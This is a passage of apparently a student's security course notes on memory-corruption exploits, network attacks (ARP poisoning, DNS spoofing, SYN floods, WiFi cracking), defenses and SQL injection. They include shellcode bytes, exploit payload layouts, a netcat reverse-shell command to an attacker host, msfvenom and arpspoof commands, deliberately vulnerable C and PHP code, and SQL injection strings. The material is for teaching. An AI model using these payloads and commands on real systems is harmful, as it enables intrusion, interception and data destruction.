- If you allow an attacker to start writing at a location without defining when to stop, they can overwrite other parts of memory

### Common Weakness Enumeration (CWE) 2023
Buffer overflows consistently rank in top vulnerabilities:
- **CWE-787**: Out-of-bounds Write (#1)
- **CWE-125**: Out-of-bounds Read (#5)
- **CWE-119**: Improper Restriction of Operations within the Bounds of a Memory Buffer (#19)

### Example Vulnerable Code

```c
#include <stdio.h>
int main() {
    char c = 'X'; 
    char buff[3];
    printf("Variable c holds: %c\n", c); 
    printf("Enter a 2-digit number:");
    gets(buff); // DANGEROUS - no bounds checking!
    printf("Got %s\n", buff);
    printf("Variable c holds: %c\n", c); 
    return 0;
}
```

**What happens with input longer than 2 characters?**
- Input overwrites adjacent memory
- Variable `c` gets corrupted
- Can lead to code execution

### Stack Smashing Example

```c
main() {
    func1(); 
    return;
}

func1() {
    func2(); 
    return;
}

func2() {
    char buf[12]; 
    gets(buf);    // Vulnerable!
    return;
}
```

**Stack Layout:**
```
┌─────────────────────┐
│   return addr       │ ← main
├─────────────────────┤
│   return addr       │ ← func1  
├─────────────────────┤
│   return addr       │ ← func2 (TARGET!)
├─────────────────────┤
│       buf           │ ← Input starts here
└─────────────────────┘
```

**Attack Vector:**
- Input more than 12 characters
- Overflow overwrites return address
- Control program execution flow

---

## 5. Shellcode & Exploitation

### What is Shellcode?
Compact assembly code that executes a shell or performs specific malicious actions.

**Types:**
- **Local shell** - Opens command prompt on target
- **Bind shell** - Opens listening port for remote connection  
- **Reverse shell** - Connects back to attacker

### Shellcode Characteristics:
- Very small size (often 20-100 bytes)
- Position-independent code
- Avoids null bytes (which terminate strings)
- Available from repositories like Shell-Storm

### Example Shellcode (Linux x86):
```assembly
\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80
\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3
\x89\xd1\xcd\x80
```

### NOP Sled Technique

Since it's difficult to hit shellcode exactly, attackers use **NOP sleds**:

```
┌─────────────────────┐
│     PAYLOAD         │
├─────────────────────┤
│  NOP NOP NOP NOP    │ ← NOP Sled (\x90)
│  NOP NOP NOP NOP    │
│  NOP NOP NOP NOP    │ 
│    SHELLCODE        │ ← Actual malicious code
├─────────────────────┤
│   RETURN ADDRESS    │ ← Points somewhere in NOP sled
└─────────────────────┘
```

**NOP (No Operation)** instructions do nothing but advance to next instruction, creating a "landing pad" for imprecise jumps.

### Complete Buffer Overflow Attack Steps:

1. **Find memory safety vulnerability** (e.g., buffer overflow)
2. **Write shellcode at known memory address**
3. **Overwrite RIP with address of shellcode**
4. **Return from function** (triggers shellcode execution)
5. **Execute malicious code**

### Practical Example:

```c
void vulnerable(void) { 
    char buff[20]; 
    gets(buff);
}
```

**Exploit Input:**
```
SHELLCODE + 'A' * 12 + '\xef\xbe\xad\xde'
```

- Shellcode fills first part of buffer
- 'A' * 12 fills remaining buffer + saved frame pointer  
- `\xef\xbe\xad\xde` overwrites return address (little-endian format)

---

## 6. Format String Attacks

### The Vulnerability
Functions like `printf()` are **variable-argument functions** that blindly trust the number of arguments matches the format placeholders.

### Dangerous Usage:
```c
// VULNERABLE - user input as format string
printf(user_input);

// SAFE - user input as argument  
printf("%s", user_input);
```

### What Goes Wrong?

**Normal Case:**
```c
printf("Lucky nums are %x and %x", 13, 4);
```

**Vulnerable Case:**
```c
printf("Lucky nums are %x and %x");  // No arguments provided!
```

### Stack Layout Issue:

```
┌─────────────────────┐
│     main's frame    │
├─────────────────────┤
│        ???          │ ← printf reads these values
│        ???          │ ← as "missing" arguments
├─────────────────────┤
│   return addr       │
├─────────────────────┤
│   prev frame ptr    │  
├─────────────────────┤
│  "Lucky nums..."    │
└─────────────────────┘
```

### The %n Attack Vector

**%n format specifier**: Writes the number of characters printed so far to an integer pointer.

**Normal Usage:**
```c
int val;
printf("one two %n three\n", &val);  // val = 8
```

**Attack Usage:**
```c
printf("AAAA%n");  // Writes to whatever address is on stack!
```

### Vulnerable Functions:
- **Printing**: printf, fprintf, sprintf, vprintf, vfprintf, vsprintf
- **Logging**: syslog, err, warn

### Attack Capabilities:
- **Read arbitrary memory** (using %x, %s, etc.)
- **Write to arbitrary memory** (using %n)
- **Execute shellcode** (by overwriting function pointers/return addresses)

---

## 7. Integer Overflow Attacks

### The Problem
What happens when integer exceeds maximum value?

### Data Type Limits:
- **char** (8 bits): 0-255 for unsigned, -128 to 127 for signed
- **short** (16 bits): 0-65535 for unsigned
- **int** (32 bits): 0-4294967295 for unsigned

### Overflow Examples:
```c
char c;        // 8 bits
short s;       // 16 bits  
int m;         // 32 bits

c = 0x80 + 0x80 = 128 + 128 ⇒ c = 0     (overflow)
s = 0xff80 + 0x80 ⇒ s = 0               (overflow)
m = 0xffffff80 + 0x80 ⇒ m = 0           (overflow)
```

### Real-World Examples:

**Gandhi Bug in Civilization:**
- Gandhi had aggression rating of 1 (lowest possible)
- Democracy reduces aggression by 2
- 1 - 2 = -1, but unsigned byte wraps to 255 (maximum aggression!)

**F5 Big IP Vulnerability (Dec 2020):**
```c
if (8190 - nlen <= vlen) // length check return -1;
```
- If `nlen > 8190`, subtraction underflows to large positive number
- Length check bypassed, leading to buffer overflow

---

## 8. Workshop Activities & Practical Exercises

### Format String Exploitation

**Setup Commands:**
```bash
# Install required tools
sudo apt install gcc-multilib
sudo apt update && sudo apt install gdb

# Disable memory randomization  
sudo echo "kernel.randomize_va_space = 0" >> /etc/sysctl.conf
sysctl -p

# Enable core dumps
ulimit -c unlimited
```

### Python for Payload Generation:
```python
# Python2 for raw bytes
python2 -c 'print "A"*100'

# Python3 equivalent  
python3 -c 'print("A"*100)'

# Hex bytes
python3 -c 'print("\x41\x42"*100)'

# Non-ASCII
python3 -c 'print("\xef\xbe"*100)'
```

### GDB Usage:
```bash
# Launch debugger
gdb -q program_name

# Set Intel syntax
set disassembly-flavor intel

# List source code
list

# Set breakpoint  
br line_number

# Run program
run

# Examine memory
x/40x $esp

# Show frame info
info frame
```

### Buffer Overflow Example:

**grade.c:**
```c
#include <stdio.h>
#include <stdlib.h>
int main(int argc, char **argv) {
    volatile char grade[] = "F";
    char buf[19];
    printf("Enter your student ID: ");
    gets(buf);
    printf("Hello %s! Your grade is %s!\n", buf, grade);
    return 0;
}
```

**Compilation:**
```bash
gcc -m32 -g -fno-stack-protector -w -o grade grade.c
```

**Exploitation:**
```bash
# Change grade from F to A
python3 -c 'print("A"*20)' | ./grade

# More controlled approach
python3 -c 'print("a1112407\0" + "A"*11)' | ./grade
```

---

## 9. Advanced Topics

### Stack Overflow to Change Program Flow

**Example Program:**
```c
void win() {
    printf("You win!\n");
}

void hello() {
    char buf[17];
    printf("What is your name? ");
    gets(buf);
    printf("Hello %s!\n", buf);
}

int main(int argc, char **argv) {
    hello();
    return 0;
}
```

**Attack Strategy:**
1. Find address of `win()` function using `print win` in GDB
2. Calculate offset to return address (typically buffer size + saved EBP)
3. Craft payload: `padding + target_address_in_little_endian`

### Shellcode Injection

**Complete Example:**
```c
#include <stdio.h>
#include <string.h>
int func(char *str) {
    char buf[128];
    strcpy(buf, str);
    return 0;
}

int main(int argc, char *argv[]) {
    func(argv[1]);
    return 0;
}
```

**Compilation for Shellcode:**
```bash
gcc -m32 -g -z execstack -fno-stack-protector -no-pie -o simple simple.c
```

**SUID Setup:**
```bash
sudo chown root:root simple
sudo chmod u+s simple
```

**Payload Structure:**
```
NOP_SLED (80 bytes) + SHELLCODE (34 bytes) + FILLER (26 bytes) + RETURN_ADDRESS (4 bytes)
```

**Example Shellcode (34 bytes):**
```
\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80
```

# 0x06 More Memory Attacks and Defense

## Overview
This document covers advanced memory attacks beyond basic stack smashing, including heap-based attacks and various defense mechanisms.

## Table of Contents
1. [Return to libc Attack](#return-to-libc-attack)
2. [Heap-Based Attacks](#heap-based-attacks)
3. [Defense Mechanisms](#defense-mechanisms)
4. [Remote Buffer Overflow](#remote-buffer-overflow)

---

## Return to libc Attack

### What is Return to libc?
- **Purpose**: Bypass non-executable stack protections (DEP/NX bit)
- **Method**: Instead of injecting shellcode, redirect execution to existing library functions
- **Target**: `system()` function in libc to execute commands like `/bin/sh`

### How Return to libc Works
1. **Normal Operation**: Program returns to its own code after function call
2. **Attack**: Overwrite return address to point to `system()` function in libc
3. **Execution**: When function returns, it jumps to `system()` instead of program code

### Memory Layout
```
STACK (grows downward)
HEAP (grows upward)
BSS
DATA
TEXT (PROGRAM)
```

### Attack Steps
1. **Find vulnerability**: Buffer overflow in program (e.g., using `strcpy()`)
2. **Locate addresses**:
   - Address of `system()` function: `0xf7e175e0`
   - Address of `exit()` function: `0xf7e0a360`
   - Address of "/bin/sh" string: `0xf7f5b406`
3. **Craft payload**: Fill buffer + system address + exit address + "/bin/sh" address
4. **Execute**: Overflow triggers jump to `system("/bin/sh")`

### Example Payload Structure
```
[24 bytes of 'A'] + [system() addr] + [exit() addr] + ["/bin/sh" addr]
```

### Finding "/bin/sh" String
- **Method 1**: Use environment variables (unreliable due to address changes)
- **Method 2**: Search in libc memory space using `find` command in gdb
- **Reliable approach**: `find 0xf7dd3000,+99999999,"/bin/sh"`

## Heap-Based Attacks

### Heap vs Stack Comparison

| **HEAP** | **STACK** |
|----------|-----------|
| Dynamic memory allocations at runtime | Fixed memory allocations known at compile time |
| Objects, big buffers, structs | Local variables, return addresses, function args |
| Slower, Manual (malloc/free) | Fast, Automatic |
| Done by programmer | Done by compiler |

### Types of Heap Attacks

#### 1. Simple Heap Overflow
```c
char *user = malloc(8);
char *adminuser = malloc(8);
strcpy(adminuser, "root");
strcpy(user, argv[1]); // Vulnerable - can overflow into adminuser
```

#### 2. Heap Spraying
- **Purpose**: Make heap overflow exploitation more reliable
- **Method**: Fill heap with shellcode and NOP sleds using JavaScript
- **Target**: Browser heap memory
- **Advantage**: Don't need to know exact shellcode location

**Process**:
1. Use JavaScript to allocate many heap objects containing shellcode
2. Overflow heap buffer to overwrite function pointer
3. Point function pointer anywhere in spray area
4. NOP sled ensures execution reaches shellcode

#### 3. Use After Free
- **Vulnerability**: Using memory after it has been freed
- **Process**:
  1. Pointer `p` points to heap chunk A containing function address
  2. Chunk A is freed
  3. Attacker allocates new data in same location
  4. Original pointer still used, now points to attacker data

**Real Example - IE11 CVE-2014-0282**:
```html
<script>
function changer() {
    document.getElementById("form").innerHTML = "";
    CollectGarbage(); // Frees form elements
}
document.getElementById("c1").onpropertychange = changer;
document.getElementById("form").reset(); // Triggers use after free
</script>
```

## Defense Mechanisms

### 1. Data Execution Prevention (DEP)
- **Purpose**: Mark memory regions as non-executable
- **Implementation**: NX-bit (AMD), XD-bit (Intel), XN-bit (ARM)
- **Protection**: Prevents shellcode execution on stack/heap
- **Limitation**: Can be bypassed with Return-Oriented Programming (ROP)

### 2. Address Space Layout Randomization (ASLR)
- **Purpose**: Randomize memory layout to make addresses unpredictable
- **Randomized Components**:
  - Stack base address
  - Heap base address
  - Library (DLL) base addresses
  - Executable base address

**Windows Implementation**:
- Since Windows 8: 24 bits of randomness on 64-bit systems
- Compiler flag: `/DynamicBase`

### 3. Stack Protection (Canaries)

#### StackGuard Implementation
- **Method**: Insert "canary" values between local variables and return address
- **Check**: Verify canary integrity before function return
- **Action**: Terminate program if canary modified

#### Canary Types
1. **Random Canary**: Random value chosen at program startup
2. **Terminator Canary**: Contains null bytes, newlines that stop string functions

#### Stack Layout with Canary
```
[local variables] [canary] [saved frame pointer] [return address]
```

#### Limitations
- **Heap attacks**: Still possible
- **Exception handlers**: Can bypass canary checks
- **Canary extraction**: Possible through crash-and-restart services
- **Partial overwrites**: May leave canary intact

### 4. Shadow Stack
- **Concept**: Maintain separate copy of return addresses
- **Implementation**: Intel CET (Control Flow Enforcement Technology)
- **Process**:
  1. On function call: Push return address to both regular and shadow stack
  2. On return: Verify both addresses match
  3. If mismatch: Terminate program

**Hardware Support**:
- New register: SSP (Shadow Stack Pointer)
- Special memory pages marked as "shadow stack"
- Only CALL/RET instructions can access shadow stack pages

### 5. Control Flow Integrity (CFI)
- **Goal**: Ensure control flow follows program's intended flow graph
- **Coarse CFI**: Check that indirect calls target valid function entry points
- **Implementation**: Control Flow Guard (CFG) in Windows 10

**CFG Process**:
```assembly
mov esi, [esi]      ; Load target address
mov ecx, esi        ; Copy target
push 1
call @_guard_check_icall@4  ; Verify target is valid
call esi            ; Make the call
```

### 6. Memory Tagging
- **Concept**: Tag memory regions and pointers with metadata
- **Protection**: Prevents buffer overflows and use-after-free
- **Example ARM MTE**:
  ```
  char *p = malloc(40);  // p = 0xB000_6FFF_FFF5_1240 (tagged as B)
  p[50] = 'a';          // B≠7 ⇒ tag mismatch exception
  free(p);              // Memory re-tagged from B to E  
  p[7] = 'a';           // B≠E ⇒ tag mismatch exception
  ```

### 7. Exception Handler Protection

#### Problem
- Exception handlers can be overwritten to bypass canaries
- Exception triggered before canary check

#### Solutions
- **SAFESEH**: Linker creates table of valid exception handlers
- **SEHOP**: Add dummy record at top of exception handler list, verify integrity

---

## Remote Buffer Overflow

### Concept
- **Scenario**: Exploit network services without local access
- **Challenge**: Cannot inject local shell, need remote backdoor

### Forward Shell vs Reverse Shell

#### Forward Shell
- **Method**: Server opens listening port for incoming connections
- **Command**: `netcat -vl -p 3333 -e /bin/bash`
- **Limitation**: Requires open inbound ports (blocked by firewalls)

#### Reverse Shell
- **Method**: Compromised server connects back to attacker
- **Advantage**: Works through firewalls (outbound connections usually allowed)
- **Process**:
  1. Attacker listens: `netcat -lvp 5555`
  2. Compromised server connects: `netcat attacker_ip 5555 -e /bin/bash`

### Exploitation Process
1. **Create vulnerable server**: Echo server with buffer overflow
2. **Generate shellcode**: Use msfvenom for bind shell payload
   ```bash
   msfvenom -p linux/x86/shell_bind_tcp LPORT=3334 -f python -b 0x00
   ```
3. **Craft exploit**: NOP sled + shellcode + padding + return address
4. **Execute**: Send payload to crash server and gain shell access

### Payload Structure
```python
payload = NOP_sled + shellcode + padding + return_address
# Where return_address points into NOP sled
```

---

## Key Defense Bypass Techniques

### 1. Canary Bypass Methods
- **Exception handling**: Trigger exception before canary check
- **Partial overwrites**: Modify return address without touching canary
- **Canary extraction**: Brute force canary value through crash-restart cycles

### 2. ASLR Bypass Methods
- **Information leaks**: Extract addresses through error messages
- **Brute force**: Try multiple addresses (effective with crash-restart)
- **Partial overwrites**: Modify only low bytes of addresses

### 3. DEP Bypass Methods
- **Return-to-libc**: Use existing executable code
- **ROP (Return-Oriented Programming)**: Chain together code gadgets
- **JIT spraying**: Abuse Just-In-Time compilers that need executable memory

---

## Exam Key Points

### Critical Concepts
1. **Memory layout understanding**: Stack vs heap, memory regions
2. **Attack progression**: Simple overflow → sophisticated bypasses
3. **Defense layering**: No single defense is sufficient
4. **Exploit development**: From local to remote exploitation

### Important Addresses/Commands
- **GCC compilation flags**: `-fno-stack-protector`, `-z execstack`, `-z noexecstack`
- **Finding addresses**: `info proc map`, `find` command in gdb
- **Payload tools**: `msfvenom` for shellcode generation

### Real-World Relevance
- **CVE examples**: IE11 CVE-2014-0282 demonstrates use-after-free
- **Modern protections**: Windows 10 CFG, Intel CET, ARM MTE
- **Ongoing research**: Memory safety remains active area

## Packet Sniffing

### Definition
**Sniffing** = Eavesdropping on network communications

### CIA Impact
- **Confidentiality**: ✓ Affected (primary impact)
- **Integrity**: Not directly affected
- **Availability**: Not directly affected

### Types of Networks for Sniffing

#### 1. Non-Switched Network (Hub-based)
- **Method**: Passive sniffing
- **Requirements**: Layer-1 Hub environment
- **Characteristics**:
  - ALL workstations receive ALL packets
  - Very easy to perform passive sniffing
  - Simulated in VirtualBox using "Promiscuous Mode = Allow All"
  - **Status**: Not common anymore (noisy, insecure, inefficient)

#### 2. Open Wireless Networks
- **Method**: Passive sniffing
- **Risk Level**: Very High
- **Characteristics**:
  - All traffic visible to everyone on the network
  - No encryption protection
  - Common in public WiFi hotspots

#### 3. Physical Tap Devices
- **Examples**:
  - **Hak5 LAN Turtle**: MITM device
  - **Optic Fibre Tap**: Hardware interception
  - **TAP and SPAN ports**: Switch Port Analyzer/Mirror Port
- **Historical Example**: Operation Ivy Bells (US CIA/Navy wiretapping Soviet underwater communications during Cold War)

- Usage: `sudo driftnet -i eth0`
- Demonstrates data leakage in unencrypted HTTP traffic

---

## Man-in-the-Middle (MITM) Attacks

### ARP (Address Resolution Protocol) Fundamentals

#### ARP Process
1. **ARP Request**: Broadcast "Who has IP X.X.X.X?"
2. **ARP Reply**: Unicast "It's me! My MAC is XX:XX:XX:XX:XX:XX"
3. **ARP Cache Update**: Store IP → MAC mapping
4. **Packet Transmission**: Use cached MAC for future communications

#### ARP Cache
- Maps IP addresses to Physical (MAC) addresses
- Command to view: `arp -a` or `arp -n`
- Temporary storage with TTL

### MITM via ARP Cache Poisoning

#### Requirements
- **Network Position**: Attacker must be on same subnet (broadcast domain)
- **Tools**: arpspoof, Ettercap
- **Access**: Ability to send ARP replies

#### Attack Process
1. **Enable IP Forwarding**: `echo 1 > /proc/sys/net/ipv4/ip_forward`
2. **Poison Victim's ARP Cache**: 
   ```bash
   sudo arpspoof -t [victim_IP] [gateway_IP]
   ```
3. **Poison Gateway's ARP Cache**: 
   ```bash
   sudo arpspoof -t [gateway_IP] [victim_IP]
   ```
4. **Result**: All victim traffic routes through attacker

#### MITM Attack Flow
1. Victim sends traffic intended for gateway
2. Traffic goes to attacker (due to poisoned ARP cache)
3. Attacker forwards traffic to real gateway
4. Response returns through attacker
5. Attacker can inspect, modify, or log all traffic

### Ettercap - Automated MITM Tool

#### Installation and Usage
```bash
sudo ettercap -G  # Launch GUI version
```

#### Configuration Steps
1. Start packet sniffing
2. Scan for hosts (magnifying glass icon)
3. Add victim IP as "Target 1"
4. Add gateway IP as "Target 2"
5. Start ARP poisoning attack
6. Monitor intercepted traffic and credentials

## DNS Attacks

### DNS System Overview
- **Purpose**: Translate human-readable domain names to IP addresses
- **Structure**: Hierarchical tree (root → TLD → domain → subdomain)
- **Process**: Recursive resolution through multiple name servers

### Types of DNS Attacks

#### 1. Hosts File Poisoning
- **Target**: Local hosts file
- **Locations**:
  - Unix/Linux: `/etc/hosts`
  - Windows: `C:\Windows\System32\drivers\etc\hosts`
- **Method**: Modify local DNS resolution
- **Impact**: Redirect specific domains to malicious servers

#### 2. DNS Spoofing (dnsspoof)
- **Requirements**: Same subnet access + traffic sniffing capability
- **Method**: Intercept DNS queries and send fake responses
- **Tools**: dnsspoof (part of dsniff suite)
- **Process**:
  1. Monitor for DNS queries
  2. Send spoofed DNS response before legitimate response
  3. Victim caches malicious IP address
  4. Subsequent connections go to attacker-controlled server

### DNSSEC (DNS Security Extensions)

#### Purpose
Prevent DNS spoofing through cryptographic authentication

#### Key Components
1. **Digital Signatures**: Only private key owner can sign records
2. **Chain of Trust**: Certificate hierarchy from root to domain
3. **DNSKEY Records**: Public keys for verification
4. **RRSIG Records**: Signatures on DNS records
5. **DS Records**: Hash of child zone's public key

#### DNSSEC Lookup Process
1. **Root Server**: Provides signed delegation to TLD
2. **TLD Server**: Provides signed delegation to domain
3. **Domain Server**: Provides signed answer record
4. **Verification**: Each step verified using parent's signature

### **DNS over TCP vs UDP Security Considerations**

#### DNS over UDP (Default - Port 53)
- **Characteristics**: Connectionless, lightweight, fast
- **Vulnerabilities**: Easy to spoof source IP, no inherent reliability
- **MITM Susceptibility**: High - attacker can easily inject fake responses

#### DNS over TCP (Port 53)
- **When Used**: Large responses (>512 bytes), zone transfers, reliability needed
- **TCP Guarantees**:
  - ✅ **Reliability**: Packet delivery confirmation, retransmission
  - ✅ **Ordering**: In-sequence delivery
  - ✅ **Error Detection**: Basic checksum validation
- **What TCP Does NOT Guarantee Against MITM**:
  - ❌ **Confidentiality**: Data still plaintext, attacker can read
  - ❌ **Integrity**: Attacker can modify data in transit
  - ❌ **Authenticity**: No verification of server identity
  - ❌ **Replay Protection**: Attacker can replay valid responses

**Key Point**: Raw TCP provides transport reliability but NOT cryptographic security. For true MITM protection, need DNS over TLS (DoT), DNS over HTTPS (DoH), or DNSSEC.

## Denial of Service (DoS) and DDoS Attacks

### TCP Reset (RST) Injection

#### Requirements
- Knowledge of source/destination ports
- Current sequence numbers
- Network position to inject packets

#### Process
1. Sniff active TCP connection
2. Craft RST packet with correct sequence number
3. Send RST before legitimate traffic
4. Connection terminated abruptly

### SYN Flooding Attack

#### Mechanism
- Exploit TCP three-way handshake
- Send massive SYN packets with spoofed source IPs
- Server allocates resources for each half-open connection
- Server memory exhausted → legitimate connections denied

#### Tools
```bash
# Using netwox
netwox 76 --dst-ip "target_ip" --dst-port "80"

# Using Metasploit
use auxiliary/dos/tcp/synflood
set RHOSTS target_ip
run
```

#### SYN Flood Countermeasure: SYN Cookies
1. **Don't allocate resources** on initial SYN
2. **Generate cryptographic cookie** based on:
   - Time (64-second window)
   - Maximum Segment Size (MSS)
   - Hash of connection 4-tuple
3. **Validate cookie** in subsequent ACK
4. **Only then allocate** connection resources

### Distributed Denial-of-Service (DDoS)

#### Characteristics
- **Multiple attack sources**: Botnet coordination
- **Massive bandwidth**: Combined capacity of many systems
- **Difficult filtering**: Traffic appears from legitimate sources
- **Botnet**: Collection of compromised computers under single control

#### DDoS Attack Types

##### Smurf Attack
- **Method**: ICMP Echo requests to broadcast address
- **Spoofing**: Use victim's IP as source
- **Amplification**: All hosts on network respond to victim
- **Countermeasure**: Disable broadcast PING on routers

##### DNS Amplification
- **Method**: Send small DNS queries with spoofed victim IP
- **Amplification**: DNS responses much larger than queries
- **Result**: Victim receives massive DNS response traffic
- **Multiplier**: Can achieve 50x+ amplification

## WiFi Security

### WiFi Security Evolution

#### Timeline
1. **1997**: 802.11 Ratification
2. **1997-2003**: WEP (Wired Equivalent Privacy)
3. **2003**: WPA (Wi-Fi Protected Access)
4. **2004**: WPA2 (Wi-Fi Protected Access II)
5. **2018**: WPA3 (Wi-Fi Protected Access III)

### WEP (Wired Equivalent Privacy)

#### Characteristics
- **Encryption**: RC4 stream cipher
- **Key Size**: 24-bit IV + 104-bit fixed key (128-bit total)
- **Vulnerability**: Weak IV implementation
- **Status**: Retired in 2004 due to fundamental flaws

#### WEP Attack Method
- **Technique**: ARP replay to generate traffic
- **Goal**: Collect sufficient IVs with different keystreams
- **Time to crack**: Minutes with sufficient traffic

### WPA2 Security

#### Design Goals
1. Password-based network access
2. Encrypted communications using derived keys
3. Protection against attackers without password

#### WPA2 4-Way Handshake
1. **Client Authentication Request** → Access Point
2. **Derive PSK** (Pre-Shared Key) from password
3. **ANonce** (Access Point Nonce) → Client
4. **Client generates SNonce**, derives PTK (Pairwise Transport Keys)
5. **SNonce + MIC** → Access Point
6. **Access Point derives PTK**, verifies MIC
7. **MIC + GTK** (Group Transport Key) → Client
8. **ACK** → Access Point (handshake complete)

#### Key Derivation Process
```
WiFi Password → PSK (Pre-Shared Key)
PSK + ANonce + SNonce + MAC addresses → PTK (Pairwise Transport Keys)
```

### WPA2 Attack Methods

#### Offline Brute-Force Attack
- **Requirements**: Captured 4-way handshake
- **Process**:
  1. Guess password
  2. Derive PSK from guess
  3. Calculate expected MIC using captured nonces
  4. Compare with actual MIC from handshake
  5. Match = correct password

#### Dictionary Attack Timeframes
| Password Length | Lowercase | Uppercase + Lowercase | Numbers + Letters + Symbols |
|----------------|-----------|----------------------|---------------------------|
| 6 characters   | Instantly | 1 second             | 5 seconds                |
| 8 characters   | 5 seconds | 22 minutes           | 8 hours                  |
| 10 characters  | 58 minutes| 1 month              | 5 years                  |
| 12 characters  | 3 weeks   | 300 years            | 34,000 years             |

### Recent WiFi Vulnerabilities

#### WPA2 Vulnerabilities

## Firewalls and Intrusion Detection Systems

### Firewalls and Perimeter Security

#### Core Concept
- **Single point of control** for network access
- **Policy-based filtering** of inbound/outbound traffic
- **Perimeter defense** protecting internal networks

#### Firewall Types

| Type | Feature | Pros | Cons |
|------|---------|------|------|
| **Stateless (Packet Filter)** | Examines IP headers only | Fast processing | Misses spoofed packets and complex attacks |
| **Stateful (Full Packet Inspection)** | Tracks TCP session state | Detects more attack types | Slower, more expensive |
| **Application (Layer 7) Proxy** | Examines application data | Detects application-layer attacks (SQL injection, XSS) | Significant performance impact |

### Network Segmentation Strategies

#### Traditional Segmentation
- **DMZ**: Internet-facing servers in isolated zone
- **North-South Traffic**: Restrictive (Internet ↔ Internal)
- **East-West Traffic**: Relatively relaxed (Internal ↔ Internal)

#### Microsegmentation
- **Granular policies**: Server-to-server specific rules
- **Zero-trust model**: Assume any endpoint can be compromised
- **Isolation benefits**: Limit lateral movement during breaches

### Intrusion Detection/Prevention Systems (IDS/IPS)

#### Detection Methodologies

##### 1. Signature-Based Detection
- **Method**: Match known attack patterns
- **Pros**: Low false positives, specific threat identification
- **Cons**: Cannot detect new/unknown attacks

##### 2. Anomaly-Based Detection
- **Method**: Statistical analysis of network behavior
- **Pros**: Can detect unknown attacks
- **Cons**: Higher false positive rates

##### 3. Stateful Protocol Analysis
- **Method**: Understand expected protocol behavior
- **Pros**: Detects protocol-specific attacks
- **Cons**: Resource intensive

#### Deployment Options
- **Inline (IPS)**: Can block malicious traffic in real-time
- **Passive (IDS)**: Monitor and alert only, no blocking capability

## HTTP Basics & Web Architecture

### What is the Web?
- **Web (World Wide Web)**: A collection of data and services
- **Data and services** are provided by **web servers**
- **Data and services** are accessed using **web browsers** (Chrome, Firefox, etc.)

### Elements of the Web

#### URLs (Uniform Resource Locators)
- **Domain**: Located after double slashes (`//`), before the next single slash
  - Defines which web server to contact
  - Example: `https://myuni.adelaide.edu.au/courses/95262`
- **Path**: Located after the first single slash
  - Defines which file on the web server to fetch
  - Example: `/courses/95262`
- **Query**: Optional, located after a question mark (`?`)
  - Supplies arguments to the web server for processing
  - Arguments supplied as `name=value` pairs
  - Multiple arguments separated with ampersands (`&`)
  - Example: `?is_announcement=true`

#### HTML (Hypertext Markup Language)

## Tools for Web Application Analysis

### Developer Tools (Built-in Browser Tools)
- **Access**: Press F12 in most browsers
- **Features**:
  - Inspect HTML/CSS
  - View network requests/responses
  - Debug JavaScript
  - Modify page elements in real-time

### Local Proxy Tools

#### Burp Suite (Most Popular)
- **Function**: Intercepts and records HTTP requests (like Wireshark for web traffic)
- **Default setup**: Listens on `localhost:8080`
- **Key features**:
  - **Proxy**: Capture and modify traffic on-the-fly
  - **Repeater**: Repeat GET and POST requests for testing
  - **Intruder**: Systematic testing with payloads (brute force)
  - **Spider**: Automatically crawl links to discover pages
  - **Scanner**: Automatically look for vulnerabilities
  - **Audit**: Look for hidden directories and files

#### OWASP ZAP
- Free alternative to Burp Suite
- Similar functionality for web application security testing

#### Key Advantages
- Bypass front-end controls (read-only fields, hidden fields, JavaScript validation)
- Modify requests before they reach the server
- Record and analyze all HTTP traffic

## Server-Side Scripting (PHP)

### What is PHP?
- **PHP**: Hypertext Preprocessor (current version 8.2)
- **Server-side scripting language** that can be embedded into HTML
- **Goal**: Generate client-side code (HTML, CSS, JavaScript)

### PHP Syntax Basics

#### PHP Tags
- Start: `<?php`
- End: `?>`

#### Example PHP File
```php
<html>
<head>
    <title>PHP Introduction</title>
</head>
<body>
    This is HTML! <br />
    <?php
        echo 'This is PHP! <br />'; // prints to screen
        /*
        Multi-line comment
        */
    ?>
</body>
</html>
```

#### PHP Comments
- Single line: `//` or `#`
- Multi-line: `/* ... */`

### PHP Lifecycle
1. **Browser requests** `.php` file
2. **Web server** receives request
3. **PHP engine** processes PHP code
4. **Server returns** generated HTML
5. **Browser receives** standard HTML (PHP code not visible to client)

### Vulnerable PHP Example
```php
<?php
if(isset($_POST['ping'])) {
    $ip = $_POST['ip'];
    $cmd = shell_exec('ping -c 4 '.$ip); 
    print("<pre>{$cmd}</pre>");
}
?>
```
**Why dangerous**: User input directly concatenated into shell command without validation.

## SQL Injection Attacks

### Database Fundamentals

#### SQL Databases
- **SQL**: Structured Query Language
- **Structure**: Each database contains multiple tables
- **Tables**: Predefined structure with columns (fields) and rows (entries)

#### Example Table Structure
| ID | User | Firstname | Lastname | Password | Email |
|----|------|-----------|----------|----------|-------|
| 1 | jsmith | John | Smith | password | jsmith@xx.com |
| 2 | jdoe | John | Doe | toor | jdoe@yy.com |
| 3 | bsmith | George | Michael | Monkey | gmic@zz.com |

### SQL Basics

#### SELECT Statement
```sql
SELECT firstname, lastname FROM users;
```
**Result**: Returns firstname and lastname columns for all users

#### WHERE Clause
```sql
SELECT lastname FROM users WHERE firstname='John' OR id < 3;
```
**Result**: Returns users named John OR with ID less than 3

#### UNION Query
```sql
SELECT firstname, lastname FROM users1 
UNION 
SELECT fname, lname FROM users2;
```
**Result**: Combines results from two tables (must have same number of columns)

### SQL Injection Attack Types

#### 1. Authentication Bypass (`' OR 1=1--`)

**Vulnerable Code:**
```php
$sql = "SELECT user FROM users WHERE username = '$user' AND password='$password'";
```

**Attack Input:** `blah' OR 1=1--`

**Resulting Query:**
```sql
SELECT user FROM users WHERE username = 'blah' OR 1=1--' AND password='$password'
```

**Explanation:**
- `'` closes the username string
- `OR 1=1` makes condition always true
- `--` comments out the rest (password check ignored)

#### 2. UNION-based Data Extraction

**Vulnerable Code:**
```php
$sql = "SELECT name, price FROM catalogue WHERE id=$id";
```

**Attack Input:** `1 UNION SELECT name, password FROM users#`

**Resulting Query:**
```sql
SELECT name, price FROM catalogue WHERE id=1 UNION SELECT name, password FROM users#
```

**Result**: Extracts usernames and passwords from users table

#### 3. Batched SQL Statements

**Attack Input:** `Robert'); DROP TABLE Students;--`

**Resulting Query:**
```sql
